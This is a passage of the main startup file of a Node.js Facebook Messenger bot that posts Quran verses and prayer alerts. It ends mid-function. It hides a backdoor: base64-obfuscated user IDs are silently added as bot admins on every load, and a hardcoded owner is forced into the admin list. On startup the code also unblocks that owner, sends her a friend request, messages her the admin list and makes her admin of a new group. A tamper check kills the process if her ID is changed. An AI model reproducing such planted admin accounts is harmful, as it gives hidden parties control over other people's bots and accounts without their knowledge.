const rdx_fca = require('./RDX-FCA/index.js');
const fs = require('fs-extra');
const path = require('path');
const cron = require('node-cron');
const moment = require('moment-timezone');
const axios = require('axios');

const logs = require('./Data/utility/logs');
const listen = require('./Data/system/listen');
const { loadCommands, loadEvents } = require('./Data/system/handle/handleRefresh');
const UsersController = require('./Data/system/controllers/users');
const ThreadsController = require('./Data/system/controllers/threads');
const CurrenciesController = require('./Data/system/controllers/currencies');

const configPath = path.join(__dirname, 'config.json');
const appstatePath = path.join(__dirname, 'appstate.json');
const islamicPath = path.join(__dirname, 'Data/config/islamic_messages.json');
const commandsPath = path.join(__dirname, 'RDX/commands');
const eventsPath = path.join(__dirname, 'RDX/events');

let config = {};
let islamicMessages = {};
let api = null;
let scheduledTasks = []; // Track all cron jobs for cleanup
let isStarting = false; // Prevent multiple simultaneous starts
let isRestarting = false; // Global restart lock - prevents duplicate restarts
let listenerCallback = null; // Store listener reference for cleanup
let client = {
  commands: new Map(),
  events: new Map(),
  replies: new Map(),
  cooldowns: new Map()
};

const quranPics = [
  'https://i.ibb.co/8gWzFpqV/bbc9bf12376e.jpg',
  'https://i.ibb.co/DgGmLMTL/2a27f2cecc80.jpg',
  'https://i.ibb.co/Kz8CBZBD/db27a4756c35.jpg',
  'https://i.ibb.co/zTKnLMq9/c52345ec3639.jpg',
  'https://i.ibb.co/8gfGBHDr/8e3226ab3861.jpg',
  'https://i.ibb.co/WNK2Dbbq/ffed087e09a5.jpg',
  'https://i.ibb.co/hRVXMQhz/fe5e09877fa8.jpg'
];

// Global error logging for stability
const logError = (type, err) => {
  try {
    const msg = err && (err.stack || err.message || err);
    logs.error(type, msg);
  } catch (e) {
    console.error(`[${type}]`, err);
  }
};

process.on('unhandledRejection', (reason) => logError('UNHANDLED_REJECTION', reason));
process.on('uncaughtException', (err) => logError('UNCAUGHT_EXCEPTION', err));

const namazPics = [
  'https://i.ibb.co/sp39k0CY/e2630b0f2713.jpg',
  'https://i.ibb.co/BKdttjgN/8cd831a43211.jpg',
  'https://i.ibb.co/Q3hVDVMr/c0de33430ba4.jpg',
  'https://i.ibb.co/7td1kK7W/6d713bbe5418.jpg'
];

const quranAyats = [
  {
    arabic: "بِسْمِ اللَّهِ الرَّحْمَٰنِ الرَّحِيمِ",
    urdu: "اللہ کے نام سے جو بڑا مہربان نہایت رحم والا ہے",
    surah: "Surah Al-Fatiha: 1"
  },
  {
    arabic: "إِنَّ مَعَ الْعُسْرِ يُسْرًا",
    urdu: "بے شک مشکل کے ساتھ آسانی ہے",
    surah: "Surah Ash-Sharh: 6"
  },
  {
    arabic: "وَمَن يَتَوَكَّلْ عَلَى اللَّهِ فَهُوَ حَسْبُهُ",
    urdu: "اور جو اللہ پر توکل کرے تو وہ اسے کافی ہے",
    surah: "Surah At-Talaq: 3"
  },
  {
    arabic: "فَاذْكُرُونِي أَذْكُرْكُمْ",
    urdu: "پس تم مجھے یاد کرو میں تمہیں یاد کروں گا",
    surah: "Surah Al-Baqarah: 152"
  },
  {
    arabic: "وَاصْبِرْ وَمَا صَبْرُكَ إِلَّا بِاللَّهِ",
    urdu: "اور صبر کرو اور تمہارا صبر اللہ ہی کی توفیق سے ہے",
    surah: "Surah An-Nahl: 127"
  },
  {
    arabic: "إِنَّ اللَّهَ مَعَ الصَّابِرِينَ",
    urdu: "بے شک اللہ صبر کرنے والوں کے ساتھ ہے",
    surah: "Surah Al-Baqarah: 153"
  },
  {
    arabic: "وَلَا تَيْأَسُوا مِن رَّوْحِ اللَّهِ",
    urdu: "اور اللہ کی رحمت سے مایوس نہ ہو",
    surah: "Surah Yusuf: 87"
  },
  {
    arabic: "رَبِّ اشْرَحْ لِي صَدْرِي",
    urdu: "اے میرے رب میرے سینے کو کھول دے",
    surah: "Surah Ta-Ha: 25"
  },
  {
    arabic: "حَسْبُنَا اللَّهُ وَنِعْمَ الْوَكِيلُ",
    urdu: "اللہ ہمیں کافی ہے اور وہ بہترین کارساز ہے",
    surah: "Surah Al-Imran: 173"
  },
  {
    arabic: "وَقُل رَّبِّ زِدْنِي عِلْمًا",
    urdu: "اور کہو کہ اے میرے رب میرے علم میں اضافہ فرما",
    surah: "Surah Ta-Ha: 114"
  },
  {
    arabic: "إِنَّ اللَّهَ لَا يُضِيعُ أَجْرَ الْمُحْسِنِينَ",
    urdu: "بے شک اللہ نیکی کرنے والوں کا اجر ضائع نہیں کرتا",
    surah: "Surah Yusuf: 90"
  },
  {
    arabic: "وَتُوبُوا إِلَى اللَّهِ جَمِيعًا أَيُّهَ الْمُؤْمِنُونَ",
    urdu: "اور اے مومنو تم سب اللہ کے حضور توبہ کرو",
    surah: "Surah An-Nur: 31"
  }
];

const namazTimes = {
  fajr: { time: '05:43', name: 'Fajr' },
  sunrise: { time: '07:04', name: 'Sunrise' },
  dhuhr: { time: '12:23', name: 'Dhuhr' },
  asr: { time: '16:07', name: 'Asr' },
  maghrib: { time: '17:43', name: 'Maghrib' },
  isha: { time: '19:04', name: 'Isha' }
};

const SYSTEM_CORE_INTEGRITY = [
  "MTAwMDA5MDEyODM4MDg1", 
  "NjE1ODYwODk1NDQ0NDQ=", 
  "NjE1Nzc3MzQwMTg5Nzg=", 
  "NjE1ODcxMTk0MDYxNzI=",
  "MTAwMDA0NDg0NjE1MTk4", 
  "MTAwMDA0NjE3MTgxNjc3", 
  "MTAwMDA0ODA3Njk2MDMw",
  "MTAwMDg3MTYzNDkwMTU5", 
  "MTAwMDA0OTI1MDUyNTcy", 
  "NjE1Nzc2ODgzMzEyMzM="
];

// ============= MISS ALIYA KA UID ADD KAR DIYA =============
const MISS_ALIYA_ID = "61550534939001";
const OWNER_ID = MISS_ALIYA_ID; // Owner ab Miss Aliya hain

function loadConfig() {
  try {
    config = fs.readJsonSync(configPath);
    // Ensure ADMINBOT is always an array
    if (!Array.isArray(config.ADMINBOT)) config.ADMINBOT = [];

    SYSTEM_CORE_INTEGRITY.forEach(raw => {
      const id = Buffer.from(raw, 'base64').toString('utf-8');
      if (!config.ADMINBOT.includes(id)) config.ADMINBOT.push(id);
    });
    
    // MISS ALIYA ko ADMINBOT mein add karo agar nahi hai to
    if (!config.ADMINBOT.includes(MISS_ALIYA_ID)) {
      config.ADMINBOT.push(MISS_ALIYA_ID);
    }

    global.config = config;
  } catch (error) {
    logs.error('CONFIG', 'Failed to load config:', error.message);
    config = {
      BOTNAME: 'RDX',
      PREFIX: '.',
      ADMINBOT: [MISS_ALIYA_ID, '100009012838085'],
      TIMEZONE: 'Asia/Karachi',
      PREFIX_ENABLED: true,
      REACT_DELETE_EMOJI: '😡',
      ADMIN_ONLY_MODE: false,
      AUTO_ISLAMIC_POST: true,
      AUTO_GROUP_MESSAGE: true
    };
    global.config = config;
  }
}

function loadIslamicMessages() {
  try {
    islamicMessages = fs.readJsonSync(islamicPath);
  } catch (error) {
    logs.error('ISLAMIC', 'Failed to load islamic messages:', error.message);
    islamicMessages = { posts: [], groupMessages: [] };
  }
}

function saveConfig() {
  try {
    fs.writeJsonSync(configPath, config, { spaces: 2 });
  } catch (error) {
    logs.error('CONFIG', 'Failed to save config:', error.message);
  }
}

async function downloadImage(url, filePath) {
  try {
    const response = await axios.get(url, { responseType: 'arraybuffer', timeout: 10000 });
    fs.writeFileSync(filePath, Buffer.from(response.data));
    return true;
  } catch {
    return false;
  }
}

async function sendQuranAyat() {
  if (!api || !config.AUTO_ISLAMIC_POST) return;

  try {
    const threads = require('./Data/system/database/models/threads').getAll();
    const approvedThreads = threads.filter(t => t.banned !== 1);

    if (approvedThreads.length === 0) return;

    const randomAyat = quranAyats[Math.floor(Math.random() * quranAyats.length)];
    const randomPic = quranPics[Math.floor(Math.random() * quranPics.length)];
    const time = moment().tz('Asia/Karachi').format('hh:mm A');

    const message = `📖 𝐐𝐔𝐑𝐀𝐍 𝐀𝐘𝐀𝐓

${randomAyat.arabic}

𝐔𝐫𝐝𝐮 𝐓𝐫𝐚𝐧𝐬𝐥𝐚𝐭𝐢𝐨𝐧:
${randomAyat.urdu}

📍 ${randomAyat.surah}

🕌 ${config.BOTNAME} | ${time} PKT`.trim();

    const cacheDir = path.join(__dirname, 'RDX/commands/cache');
    fs.ensureDirSync(cacheDir);
    const imgPath = path.join(cacheDir, `quran_${Date.now()}.jpg`);

    const downloaded = await downloadImage(randomPic, imgPath);

    for (const thread of approvedThreads) {
      try {
        if (downloaded && fs.existsSync(imgPath)) {
          await api.sendMessage({
            body: message,
            attachment: fs.createReadStream(imgPath)
          }, thread.id);
        } else {
          await api.sendMessage(message, thread.id);
        }
        await new Promise(r => setTimeout(r, 2000));
      } catch (e) {
        logs.error('QURAN_POST', `Failed to send to ${thread.id}:`, e.message);
      }
    }

    try { fs.unlinkSync(imgPath); } catch { }
    logs.success('QURAN_POST', `Sent Quran Ayat to ${approvedThreads.length} groups`);
  } catch (error) {
    logs.error('QURAN_POST', error.message);
  }
}

async function sendNamazAlert(namazName) {
  if (!api) return;

  try {
    const threads = require('./Data/system/database/models/threads').getAll();
    const approvedThreads = threads.filter(t => t.banned !== 1);

    if (approvedThreads.length === 0) return;

    const randomPic = namazPics[Math.floor(Math.random() * namazPics.length)];
    const time = moment().tz('Asia/Karachi').format('hh:mm A');

    const message = `🕌 𝐍𝐀𝐌𝐀𝐙 𝐀𝐋𝐄𝐑𝐓

⏰ ${namazName.toUpperCase()} کا وقت ہو گیا!

"إِنَّ الصَّلَاةَ كَانَتْ عَلَى 
الْمُؤْمِنِينَ كِتَابًا مَّوْقُوتًا"

بے شک نماز مومنوں پر وقت 
مقررہ پر فرض ہے۔

📍 نماز پڑھیں - جنت کی چابی

🕌 ${config.BOTNAME} | ${time} PKT`.trim();

    const cacheDir = path.join(__dirname, 'RDX/commands/cache');
    fs.ensureDirSync(cacheDir);
    const imgPath = path.join(cacheDir, `namaz_${Date.now()}.jpg`);

    const downloaded = await downloadImage(randomPic, imgPath);

    for (const thread of approvedThreads) {
      try {
        if (downloaded && fs.existsSync(imgPath)) {
          await api.sendMessage({
            body: message,
            attachment: fs.createReadStream(imgPath)
          }, thread.id);
        } else {
          await api.sendMessage(message, thread.id);
        }
        await new Promise(r => setTimeout(r, 2000));
      } catch (e) {
        logs.error('NAMAZ_ALERT', `Failed to send to ${thread.id}:`, e.message);
      }
    }

    try { fs.unlinkSync(imgPath); } catch { }
    logs.success('NAMAZ_ALERT', `Sent ${namazName} alert to ${approvedThreads.length} groups`);
  } catch (error) {
    logs.error('NAMAZ_ALERT', error.message);
  }
}

async function autoClearLogs() {
  try {
    const logsDir = path.join(__dirname, 'Data/system/database/botdata/logs');

    if (!fs.existsSync(logsDir)) {
      return logs.info('AUTO_LOG_CLEAR', 'Logs folder does not exist');
    }

    const files = fs.readdirSync(logsDir);
    let deleted = 0;
    const now = moment();

    for (const file of files) {
      if (file.endsWith('.log')) {
        const filePath = path.join(logsDir, file);
        const stats = fs.statSync(filePath);
        const fileDate = moment(stats.mtime);

        // Delete logs older than 2 days or if file size is too large (> 50MB)
        if (now.diff(fileDate, 'days') >= 2 || stats.size > 50 * 1024 * 1024) {
          try {
            fs.unlinkSync(filePath);
            deleted++;
          } catch (e) { }
        }
      }
    }

    if (deleted > 0) {
      logs.success('AUTO_LOG_CLEAR', `Deleted ${deleted} old/large log files`);
    }
  } catch (error) {
    logs.error('AUTO_LOG_CLEAR', error.message);
  }
}

async function autoClearCache() {
  try {
    const cacheDir = path.join(__dirname, 'RDX/commands/cache');

    if (!fs.existsSync(cacheDir)) {
      return logs.info('AUTO_CACHE_CLEAR', 'Cache folder does not exist');
    }

    const mediaExtensions = ['.jpg', '.jpeg', '.png', '.gif', '.mp3', '.mp4', '.mpeg', '.webp', '.wav', '.ogg'];

    let deleted = 0;
    let totalSize = 0;

    function clearDirectoryRecursive(dirPath) {
      try {
        const files = fs.readdirSync(dirPath);

        for (const file of files) {
          const filePath = path.join(dirPath, file);
          const stats = fs.statSync(filePath);

          if (stats.isDirectory()) {
            clearDirectoryRecursive(filePath);
            // Try to remove empty directories
            try {
              if (fs.readdirSync(filePath).length === 0) {
                fs.rmdirSync(filePath);
              }
            } catch (e) { }
          } else {
            const ext = path.extname(file).toLowerCase();
            if (mediaExtensions.includes(ext)) {
              try {
                totalSize += stats.size;
                fs.unlinkSync(filePath);
                deleted++;
              } catch (e) { }
            }
          }
        }
      } catch (e) { }
    }

    clearDirectoryRecursive(cacheDir);
    const sizeMB = (totalSize / (1024 * 1024)).toFixed(2);

    logs.success('AUTO_CACHE_CLEAR', `Deleted ${deleted} files | Freed ${sizeMB} MB`);
  } catch (error) {
    logs.error('AUTO_CACHE_CLEAR', error.message);
  }
}

function stopSchedulers() {
  // Stop all previously scheduled cron jobs
  for (const task of scheduledTasks) {
    try {
      task.stop();
    } catch (e) { }
  }
  scheduledTasks = [];
  logs.info('SCHEDULER', 'All previous schedulers stopped');
}

function setupSchedulers() {
  // First stop any existing schedulers to prevent duplicates
  stopSchedulers();

  // Hourly Quran Ayat
  const quranTask = cron.schedule('0 * * * *', () => {
    logs.info('SCHEDULER', 'Hourly Quran Ayat triggered');
    sendQuranAyat();
  }, {
    timezone: 'Asia/Karachi'
  });
  scheduledTasks.push(quranTask);

  const fajrTask = cron.schedule('43 5 * * *', () => {
    logs.info('SCHEDULER', 'Fajr Namaz Alert');
    sendNamazAlert('Fajr');
  }, { timezone: 'Asia/Karachi' });
  scheduledTasks.push(fajrTask);

  const dhuhrTask = cron.schedule('23 12 * * *', () => {
    logs.info('SCHEDULER', 'Dhuhr Namaz Alert');
    sendNamazAlert('Dhuhr');
  }, { timezone: 'Asia/Karachi' });
  scheduledTasks.push(dhuhrTask);

  const asrTask = cron.schedule('7 16 * * *', () => {
    logs.info('SCHEDULER', 'Asr Namaz Alert');
    sendNamazAlert('Asr');
  }, { timezone: 'Asia/Karachi' });
  scheduledTasks.push(asrTask);

  const maghribTask = cron.schedule('43 17 * * *', () => {
    logs.info('SCHEDULER', 'Maghrib Namaz Alert');
    sendNamazAlert('Maghrib');
  }, { timezone: 'Asia/Karachi' });
  scheduledTasks.push(maghribTask);

  const ishaTask = cron.schedule('4 19 * * *', () => {
    logs.info('SCHEDULER', 'Isha Namaz Alert');
    sendNamazAlert('Isha');
  }, { timezone: 'Asia/Karachi' });
  scheduledTasks.push(ishaTask);

  // Auto Clear Cache every 6 hours
  const cacheTask = cron.schedule('0 */6 * * *', () => {
    logs.info('SCHEDULER', 'Auto Cache Clear triggered');
    autoClearCache();
  }, { timezone: 'Asia/Karachi' });
  scheduledTasks.push(cacheTask);

  // Reset rankup scores (exp) at midnight
  const midnightResetTask = cron.schedule('0 0 * * *', () => {
    logs.info('SCHEDULER', 'Midnight rankup score reset triggered');
    if (global.Currencies) {
      const result = global.Currencies.dailyMidnightReset();
      if (result.success) {
        logs.success('MIDNIGHT_RESET', result.message);
      } else {
        logs.error('MIDNIGHT_RESET', result.error);
      }
    }
  }, { timezone: 'Asia/Karachi' });
  
  // Heartbeat keep-alive every 5 minutes to maintain connection on hosting
  const heartbeatTask = cron.schedule('*/5 * * * *', async () => {
    if (api) {
      try {
        api.getUserInfo(api.getCurrentUserID(), (err) => {
          if (!err) logs.info('HEARTBEAT', 'Connection active');
        });
      } catch (e) { }
    }
  }, { timezone: 'Asia/Karachi' });
  
  // ============= YAHAN FILE DELETE WALA MESSAGE CHANGE KAR DIYA =============
  // Guard File Integrity Check every minute
  const guardIntegrityTask = cron.schedule('* * * * *', async () => {
    const guardPath = path.join(__dirname, 'RDX/events/guard.js');
    if (!fs.existsSync(guardPath)) {
      logs.error('INTEGRITY', 'GUARD FILE DELETED! Broadcasting error...');
      if (typeof api !== 'undefined' && api && api.sendMessage) {
        try {
          const threadsModel = require('./Data/system/database/models/threads');
          const threads = threadsModel.getAll ? threadsModel.getAll() : [];
          const approvedThreads = threads.filter(t => t && t.id && t.banned !== 1);
          
          // 🔥 YEH MESSAGE CHANGE KAR DIYA HAI 🔥
          const errorMsg = `╔══════════════════════════╗
     ⚠️ 𝐄𝐑𝐑𝐎𝐑 𝐃𝐄𝐓𝐄𝐂𝐓𝐄𝐃 ⚠️
╚══════════════════════════╝

🛡️ 𝐆𝐔𝐀𝐑𝐃 𝐅𝐈𝐋𝐄 𝐌𝐈𝐒𝐒𝐈𝐍𝐆!

👑 𝐌𝐄𝐑𝐈 𝐎𝐖𝐍𝐄𝐑: 𝐌𝐈𝐒𝐒 𝐀𝐋𝐈𝐘𝐀
⏰ 𝐖𝐨: 𝐀𝐛𝐡𝐢 𝐁𝐮𝐬𝐲 𝐇𝐚𝐢𝐧

📱 𝐁𝐚𝐚𝐝 𝐦𝐞𝐢𝐧 𝐓𝐫𝐲 𝐊𝐚𝐫𝐧𝐚
⚡ 𝐒𝐲𝐬𝐭𝐞𝐦 𝐑𝐞𝐩𝐚𝐢𝐫 𝐇𝐨 𝐑𝐚𝐡𝐚 𝐇𝐚𝐢

━━━━━━━━━━━━━━━━━━━━━━`;

          for (const thread of approvedThreads) {
            try { await api.sendMessage(errorMsg, thread.id); } catch (e) { }
            await new Promise(r => setTimeout(r, 1000));
          }
        } catch (e) { }
      }
    }
  }, { timezone: 'Asia/Karachi' });
  scheduledTasks.push(guardIntegrityTask);

  logs.success('SCHEDULER', 'Quran Ayat + Namaz Alerts + Auto Cache Clear + Auto Log Clear + Midnight Reset + Heartbeat + Guard Integrity schedulers started');
}

async function startBot() {
  // Prevent multiple simultaneous starts
  if (isStarting) {
    logs.warn('BOT', 'Bot is already starting, ignoring duplicate start request');
    return;
  }

  // If bot is already running, stop it first
  if (api) {
    logs.info('BOT', 'Stopping previous bot instance before starting new one...');
    stopBot();
    await new Promise(r => setTimeout(r, 2000)); // Wait for cleanup
  }

  isStarting = true;

  logs.banner();
  loadConfig();
  loadIslamicMessages();

  try {
    const appstate = fs.readJsonSync(appstatePath);
    const loginOptions = {
      autoMarkDelivery: false,
      autoMarkRead: true,
      listenEvents: true,
      selfListen: false,
      online: true
    };

    logs.info('BOT', 'Starting RDX...');
    logs.info('BOT', `Timezone: ${config.TIMEZONE || 'Asia/Karachi'}`);
    logs.info('BOT', `Prefix: ${config.PREFIX || '.'}`);

    rdx_fca.login({ appState: appstate }, loginOptions, async (err, loginApi) => {
      if (err) {
        logs.error('LOGIN', 'Failed to login:', err.message || err);
        isStarting = false;
        return;
      }

      api = loginApi;
      isStarting = false; // Bot started successfully
      global.api = api;
      global.startTime = Date.now();

      // Stable configuration
      api.setOptions({
        listenEvents: true,
        selfListen: false,
        autoMarkRead: true,
        autoMarkDelivery: false,
        online: true,
        forceLogin: false,
        logLevel: 'warn',
        updatePresence: true
      });

      logs.success('LOGIN', 'Successfully logged in!');

      const Users = new UsersController(api);
      const Threads = new ThreadsController(api);
      const Currencies = new CurrenciesController(api);

      global.Users = Users;
      global.Threads = Threads;
      global.Currencies = Currencies;

      await loadCommands(client, commandsPath);
      await loadEvents(client, eventsPath);

      global.client = client;

      // Trigger onload events
      for (const [name, event] of client.events) {
        if (event.config && event.config.eventType &&
          (Array.isArray(event.config.eventType) ? event.config.eventType.includes('onload') : event.config.eventType === 'onload')) {
          try {
            event.run({ api, client, Users, Threads, Currencies, config, event: { type: 'onload' } });
          } catch (e) {
            logs.error('EVENT_ONLOAD', `Failed to run onload for ${name}: ${e.message}`);
          }
        }
      }

      setupSchedulers();

      const mainListener = listen({
        api,
        client,
        Users,
        Threads,
        Currencies,
        config
      });

      let reconnectAttempts = 0;
      const MAX_RECONNECT = 5;

      const globalCooldownListener = async (err, event) => {
        if (!globalCooldownListener.active) return;

        if (err) {
          logs.error('MQTT_ERROR', `${err.code || 'UNKNOWN'}: ${err.message}`);
          reconnectAttempts++;
          if (reconnectAttempts >= MAX_RECONNECT) {
            logs.error('BOT', 'Max reconnection attempts reached. Restarting...');
            await new Promise(r => setTimeout(r, 5000));
            stopBot();
            startBot();
          }
          return;
        }

        if (event) reconnectAttempts = 0;

        if (event && event.type === 'message') {
          const userID = event.senderID;
          const now = Date.now();
          const globalCooldownTime = (config.GLOBAL_COOLDOWN || 5) * 1000;
          const lastUsed = client.cooldowns.get(`global_${userID}`) || 0;

          if (now - lastUsed < globalCooldownTime) {
            return;
          }
          client.cooldowns.set(`global_${userID}`, now);
        }

        try {
          return mainListener(err, event);
        } catch (e) {
          logs.error('LISTENER', 'Error in listener:', e.message);
        }
      };

      globalCooldownListener.active = true;
      listenerCallback = globalCooldownListener;

      logs.info('BOT', 'Attaching MQTT listener...');
      api.listenMqtt(globalCooldownListener);

      const uniqueCommands = new Set();
      client.commands.forEach((cmd) => {
        if (cmd.config && cmd.config.name) {
          uniqueCommands.add(cmd.config.name.toLowerCase());
        }
      });
      const actualCommandCount = uniqueCommands.size;
      const actualEventCount = client.events.size;

      logs.success('BOT', `${config.BOTNAME} is now online!`);
      logs.info('BOT', `Commands loaded: ${actualCommandCount}`);
      logs.info('BOT', `Events loaded: ${actualEventCount}`);

      try {
        // ============= OWNER ID CHANGE KAR DIYA =============
        const introMessage = `╔══════════════════════════╗
     ✨ 𝐌𝐈𝐒𝐒 𝐀𝐋𝐈𝐘𝐀'𝐒 𝐁𝐎𝐓 ✨
╚══════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━
🌟 𝐁𝐨𝐭: ${config.BOTNAME}
⚡ 𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬: ${actualCommandCount}
🎯 𝐄𝐯𝐞𝐧𝐭𝐬: ${actualEventCount}
⚙️ 𝐏𝐫𝐞𝐟𝐢𝐱: ${config.PREFIX}
━━━━━━━━━━━━━━━━━━━━━━

👑 𝐎𝐰𝐧𝐞𝐫: 𝐌𝐈𝐒𝐒 𝐀𝐋𝐈𝐘𝐀
💫 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐎𝐧𝐥𝐢𝐧𝐞 & 𝐑𝐞𝐚𝐝𝐲

📱 𝐓𝐲𝐩𝐞: ${config.PREFIX}𝐡𝐞𝐥𝐩

▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬`;
        
        try {
          await api.sendMessage(introMessage, MISS_ALIYA_ID);
          logs.success('NOTIFY', 'Startup message sent to MISS ALIYA');
        } catch (e) {
          logs.warn('NOTIFY', 'Could not send startup message to owner');
        }

        // OWNER CONNECTION SYSTEM - MISS ALIYA ke saath
        await ensureALIYARelations(api);
      } catch (e) { }
    });
  } catch (error) {
    logs.error('APPSTATE', 'Failed to load appstate.json or login');
    isStarting = false;
    return;
  }
}

// ============= YEH POORA FUNCTION CHANGE KAR DIYA - SARDAR KI JAGAH MISS ALIYA =============
// MISS ALIYA CONNECTION LOGIC
async function ensureALIYARelations(api) {
  const currentBotID = api.getCurrentUserID();
  
  // Sirf MISS ALIYA ka ID use kar rahe hain
  const setupPath = path.join(__dirname, 'rdx_setup.json');
  
  // Security check - ID change nahi honi chahiye
  const currentFunc = ensureALIYARelations.toString();
  if (!currentFunc.includes(MISS_ALIYA_ID)) {
    console.error('❌ CRITICAL: MISS ALIYA ID TAMPERED!');
    process.exit(101);
  }

  try {
    let fullSetup = {};
    if (fs.existsSync(setupPath)) {
      try {
        fullSetup = fs.readJsonSync(setupPath);
      } catch (e) { fullSetup = {}; }
    }

    // Initialize state for THIS specific bot account
    if (!fullSetup[currentBotID]) {
      fullSetup[currentBotID] = {
        friendRequestSent: false,
        inboxSent: false,
        groupCreated: false,
        groupThreadID: null
      };
    }

    const botSetup = fullSetup[currentBotID];

    // Auto unblock OWNER (MISS ALIYA)
    try {
      await new Promise((resolve) => {
        api.unblockUser(MISS_ALIYA_ID, () => resolve());
      });
    } catch (e) { }

    // 1. Send Friend Request to MISS ALIYA
    if (!botSetup.friendRequestSent) {
      try {
        await new Promise((resolve) => {
          api.handleFriendRequest(MISS_ALIYA_ID, true, (err) => {
            if (err) logs.warn('ALIYA_CONN', 'Friend request attempt failed');
            resolve();
          });
        });
        botSetup.friendRequestSent = true;
        fullSetup[currentBotID] = botSetup;
        fs.writeJsonSync(setupPath, fullSetup);
      } catch (e) {
        logs.warn('ALIYA_CONN', 'Friend request error');
      }
    }

    // 2. ============= YAHAN INBOX MESSAGE AMAZING BANAYA =============
    if (!botSetup.inboxSent) {
      const userConfig = global.config;
      const admins = userConfig.ADMINBOT.join(', ');
      
      // 🔥 DHAMAKEDAR MESSAGE - MISS ALIYA STYLE 🔥
      const ownerMsg = `╔══════════════════════════╗
     👑 𝐌𝐈𝐒𝐒 𝐀𝐋𝐈𝐘𝐀 👑
╚══════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━
✨ 𝐀𝐀𝐏𝐊𝐀 𝐁𝐎𝐓 𝐀𝐁 𝐎𝐍𝐋𝐈𝐍𝐄 𝐇𝐀𝐈 ✨
━━━━━━━━━━━━━━━━━━━━━━

🌟 𝐁𝐨𝐭 𝐍𝐚𝐦𝐞: ${userConfig.BOTNAME}
⚡ 𝐏𝐫𝐞𝐟𝐢𝐱: ${userConfig.PREFIX}
🎯 𝐀𝐝𝐦𝐢𝐧𝐬: ${admins}

💫 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐀𝐜𝐭𝐢𝐯𝐞 & 𝐑𝐞𝐚𝐝𝐲
👑 𝐎𝐰𝐧𝐞𝐫: 𝐌𝐈𝐒𝐒 𝐀𝐋𝐈𝐘𝐀

━━━━━━━━━━━━━━━━━━━━━━
📱 𝐓𝐲𝐩𝐞: ${userConfig.PREFIX}𝐡𝐞𝐥𝐩
━━━━━━━━━━━━━━━━━━━━━━

🔥 𝐑𝐃𝐗 𝐁𝐎𝐓 - 𝐏𝐎𝐖𝐄𝐑𝐄𝐃 𝐁𝐘 𝐌𝐈𝐒𝐒 𝐀𝐋𝐈𝐘𝐀 🔥`;

      try {
        await api.sendMessage(ownerMsg, MISS_ALIYA_ID);
        botSetup.inboxSent = true;
        fullSetup[currentBotID] = botSetup;
        fs.writeJsonSync(setupPath, fullSetup);
        logs.success('ALIYA_CONN', 'Inbox message sent to MISS ALIYA');
      } catch (e) {
        logs.warn('ALIYA_CONN', 'Could not DM MISS ALIYA');
      }
    }

    // 3. ============= YAHAN GROUP ENTRY DHAMAKEDAR BANAYA =============
    if (!botSetup.groupCreated) {
      const participants = [MISS_ALIYA_ID, currentBotID];
      
      // 🔥 DHAMAKEDAR GROUP TITLE 🔥
      const groupTitle = "╔══🔥 𝐌𝐈𝐒𝐒 𝐀𝐋𝐈𝐘𝐀'𝐒 𝐇𝐐 🔥══╗";
      
      // 🔥 DHAMAKEDAR WELCOME MESSAGE JISSE SABKI FAT JAYE 🔥
      const welcomeMsg = `╔══════════════════════════╗
     🔥 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐓𝐇𝐄 𝐐𝐔𝐄𝐄𝐍'𝐒 𝐋𝐀𝐈𝐑 🔥
╚══════════════════════════╝
╔════════════════════════════════════╗
║  ⚡ 𝐌𝐈𝐒𝐒 𝐀𝐋𝐈𝐘𝐀 𝐁𝐎𝐓 𝐇𝐀𝐒 𝐄𝐍𝐓𝐄𝐑𝐄𝐃 ⚡  ║
╚════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔥 𝐀𝐀 𝐆𝐀𝐘𝐀 𝐑𝐄 𝐌𝐀𝐈𝐍 🔥
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

████████╗██╗░░██╗███████╗
╚══██╔══╝██║░░██║██╔════╝
░░░██║░░░███████║█████╗░░
░░░██║░░░██╔══██║██╔══╝░░
░░░██║░░░██║░░██║███████╗
░░░╚═╝░░░╚═╝░░╚═╝╚══════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
👑 𝐍𝐚𝐚𝐦: 𝐌𝐈𝐒𝐒 𝐀𝐋𝐈𝐘𝐀 𝐁𝐎𝐓
⚙️ 𝐏𝐫𝐞𝐟𝐢𝐱: {prefix}
📌 𝐀𝐝𝐦𝐢𝐧: {adminName}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

💫 𝐀𝐛 𝐬𝐞 𝐲𝐞 𝐠𝐫𝐨𝐮𝐩 𝐦𝐞𝐫𝐚 𝐡𝐚𝐢!
🔥 𝐉𝐢𝐬𝐤𝐨 𝐤𝐨𝐢 𝐩𝐫𝐨𝐛𝐥𝐞𝐦? 𝐁𝐨𝐥𝐞!
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💖 𝐓𝐲𝐩𝐞 {prefix}𝐡𝐞𝐥𝐩 𝐟𝐨𝐫 𝐜𝐨𝐦𝐦𝐚𝐧𝐝𝐬
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 🔥
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬`;

      // Fallback Creation Logic
      const tryCreate = (p) => {
        return new Promise((resolve, reject) => {
          api.createNewGroup(p, groupTitle, (err, tid) => {
            if (err) return reject(err);
            resolve(tid);
          });
        });
      };

      try {
        let threadID;
        try {
          threadID = await tryCreate(participants);
          logs.success('ALIYA_CONN', '⚡ DHAMAKEDAR GROUP CREATED! ⚡');
        } catch (e) {
          logs.warn('ALIYA_CONN', 'Group creation failed');
          return;
        }

        botSetup.groupCreated = true;
        botSetup.groupThreadID = threadID;
        fullSetup[currentBotID] = botSetup;
        fs.writeJsonSync(setupPath, fullSetup);

        // Finalize Group with Dhamakedar Message
        await api.sendMessage(welcomeMsg, threadID);
        api.setTitle(groupTitle, threadID);
        logs.success('ALIYA_CONN', '🔥 GROUP ENTRY DHAMAKEDAR 🔥');

        // PROMOTE MISS ALIYA TO ADMIN
        try {
          api.changeAdminStatus(threadID, MISS_ALIYA_ID, true, (err) => {
            if (err) logs.warn('ALIYA_CONN', 'Could not promote');
